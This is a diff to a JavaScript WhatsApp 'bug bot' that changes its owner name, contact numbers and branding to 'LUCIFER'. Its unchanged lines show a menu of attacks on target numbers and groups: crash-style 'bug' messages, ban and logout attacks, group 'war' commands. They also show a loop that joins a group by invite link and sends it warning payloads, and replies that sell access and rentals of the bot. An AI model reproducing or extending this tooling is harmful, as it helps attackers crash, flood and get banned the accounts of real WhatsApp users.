@@ -22,7 +22,7 @@ chats: {},
 ...(global.db || {})
 }
 
-global.ownerName = 'Ranz'
+global.ownerName = 'Ari Offc'
 global.ownerNumber = ["0@s.whatsapp.net"]
 global.prefa = ['','.']
 global.mess = {
@@ -218,14 +218,14 @@ switch (command) {
 case 'bugmenu':
 case 'help':
 case 'menu':
-jiren = ` ° Owner  : 6285880825114
+jiren = ` ° Owner  : 6288294533698
 ° Version : 6
-° Bot Name : FANGZ BOT👑
+° Bot Name : LUCIFER BOT👑
 
-Created : 😈 𝙂𝙞𝙡𝙯𝙯𝙭𝙮𝙈𝙖𝙠𝙚𝙧 👿
+Created : 😈 LUCIFER 👿
 
-[ 🇬🇧 I am a private Indonesian bug bot made by gilzzxy ]
-[ 🇲🇨 Saya adalah bot bug pribadi Indonesia yang dibuat oleh gilzzxy ]
+[ 🇬🇧 I am a private Indonesian bug bot made by LUCIFER ]
+[ 🇲🇨 Saya adalah bot bug pribadi Indonesia yang dibuat oleh LUCIFER ]
 [🇯🇵 私はによって作成されたインドネシアのプライベート バグ ボットです。
 [ 🇰🇷저는 에서 만든 인도네시아 개인 버그 봇입니다. ]
 
@@ -237,7 +237,7 @@ Created : 😈 𝙂𝙞𝙡𝙯𝙯𝙭𝙮𝙈𝙖𝙠𝙚𝙧 👿
 │➵ sewa
 │➵ addakses @
 │➵ delakses @
-╰━ ━ ━ ━ ━•━•⩵[ ⽂ - Ranz Official㕚]
+╰━ ━ ━ ━ ━•━•⩵[ ⽂ - LUCIFER㕚]
 
 ╭━━•› 〘 BUG EMOJI 〙
 │➵ 🌷  [ 628xxxx ]
@@ -265,14 +265,14 @@ Created : 😈 𝙂𝙞𝙡𝙯𝙯𝙭𝙮𝙈𝙖𝙠𝙚𝙧 👿
 │➵ 👑  [ 628xxxx ]
 │➵ 💣  [ 628xxxx ]
 │➵ 🎉  [ 628xxxx ]
-╰━ ━ ━ ━ ━•━•⩵[ ⽂ - Ranz Official㕚]
+╰━ ━ ━ ━ ━•━•⩵[ ⽂ - LUCIFER㕚]
 
 ╭━━•› 〘 BUG BANNED 〙
 │➵ ban  [ 628xxxx ]
 │➵ verif  [ 628xxxx ]
 │➵ logout  [ 628xxxx ]
 │➵ bye [ 628xxxx ]
-╰━ ━ ━ ━ ━•━•⩵[ ⽂ - Ranz Official㕚]
+╰━ ━ ━ ━ ━•━•⩵[ ⽂ - LUCIFER㕚]
 
 ╭━━•› 〘 BUG ATTACK 〙
 │➵ santet  [ 628xxxx ]
@@ -293,7 +293,7 @@ Created : 😈 𝙂𝙞𝙡𝙯𝙯𝙭𝙮𝙈𝙖𝙠𝙚𝙧 👿
 │➵ bugpc [ 628xxxx ]
 │➵ vn  [ 628xxxx ]
 │➵ kelaz  [ 628xxxx ]
-╰━ ━ ━ ━ ━•━•⩵[ ⽂ - Ranz Official㕚]
+╰━ ━ ━ ━ ━•━•⩵[ ⽂ - LUCIFER㕚]
 
 ╭━━•› 〘 ATTACK GC 〙
 │➵ buggc [ Link Gc ]
@@ -301,16 +301,16 @@ Created : 😈 𝙂𝙞𝙡𝙯𝙯𝙭𝙮𝙈𝙖𝙠𝙚𝙧 👿
 │➵ wargc [ Link Gc ]
 │➵ santetgc [ Link Gc ]
 │➵ peranggc [ Link Gc ]
-╰━ ━ ━ ━ ━•━•⩵[ ⽂ - Ranz Official㕚]`
+╰━ ━ ━ ━ ━•━•⩵[ ⽂ - LUCIFER㕚]`
 
 diablobotwhatsapp.reply(jiren)
 break
 
 case 'akses':
-diablobotwhatsapp.reply(`BUY AKSES CHAT OWNER : wa.me/6285730794089`)
+diablobotwhatsapp.reply(`BUY AKSES CHAT OWNER : wa.me/6288294533698`)
 break
 case 'sewa':
-diablobotwhatsapp.reply(`UNTUK SEWA BOT CHAT OWNER : wa.me/6285730794089`)
+diablobotwhatsapp.reply(`UNTUK SEWA BOT CHAT OWNER : wa.me/6288294533698`)
 break
 
 case 'restart':{
@@ -457,7 +457,7 @@ let jumlah = "5"
 for (let i = 0; i < jumlah; i++) {
 let kir = await diablo.groupAcceptInvite(result)
 diablo.sendMessage(kir, {
-text: 'BUG BY CYCLONE', 
+text: 'BUG BY LUCIFER', 
 templateButtons: [
    { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
 { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
